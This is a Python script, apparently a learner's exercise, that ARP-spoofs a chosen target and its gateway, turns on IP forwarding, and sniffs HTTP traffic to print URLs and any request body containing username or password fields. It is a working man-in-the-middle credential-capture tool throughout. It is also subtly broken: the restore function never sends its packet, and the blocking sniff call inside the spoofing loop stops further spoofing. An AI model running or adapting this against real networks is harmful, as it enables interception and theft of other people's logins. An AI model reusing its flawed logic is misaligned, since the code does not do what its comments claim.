#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import time
import sys
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # print(arp_request.summary())
    # scapy.ls(scapy.ARP()) this is to see which parameters does scapy.ARP() accepts and how
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.summary())
    arp_request_broadcast = broadcast / arp_request
    # print(arp_request_broadcast.summary())
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(answered_list.summary())


    for element_is_variable in answered_list:

        return element_is_variable[1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    #This function is to restore the settings back to normal i.e to provide correct info to the destination and router so that they are not fooled
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
target_ip=raw_input("Mention the target ip to spoof:")
gateway_ip=raw_input("Mention the gateway ip tp spoof:")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp")--here this doesnt work cz the bpf module does not support the filtering of http requests so we need to import a new scapy module
    # here porcess_sniffed_packet is user defined fuction to catch the packets generated by this sniff function and filter it further in that function

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # in future to search any layer or to filter it inside http module use scapy.layer_name eg:- packet.haslayer(scapy.Raw)
        # print(packet[scapy.Raw].load)
        # here .load is the field name as password and username are in Raw layer and inside Raw its in field named load
        # eg:- ###[ Raw ]###
        #     load      = 'username=hey%40hotmail.com&password=hellohellohellohello&anchor='
        capture_only_login_info = packet[scapy.Raw].load
        # if "username" in capture_only_login_info:
        #     print(capture_only_login_info)

        keywords = ["username", "user", "login", "password", "pass"]
        # hey keywords help like if the programmer has a input field such as user for username then the above keywords will help to capture it
        for keyword in keywords:
            if keyword in capture_only_login_info:
                return capture_only_login_info

                # Here **return** ensures that if the field of input contains many keywords such as user and username the it prints the results for such only one

def process_sniffed_packet(packet):
    # after import the new scapy_http module we implement the below packet.haslayer(http.HTTPRequest): function here only packet variable is user defined
    if packet.haslayer(http.HTTPRequest):
        # adding packet.show() to see which layer will contain username and password fields
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >>" + url)

        login_info=get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username and password>>" + login_info + "\n\n")
try:
    sent_packets_count = 0
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+]Packets Sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

        sniff("eth0")


except KeyboardInterrupt:
     print("------------------------------------------------------------------------")
     print("[-] Detected Ctrl+c ...........Resetting ARP Tables....Please Wait")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
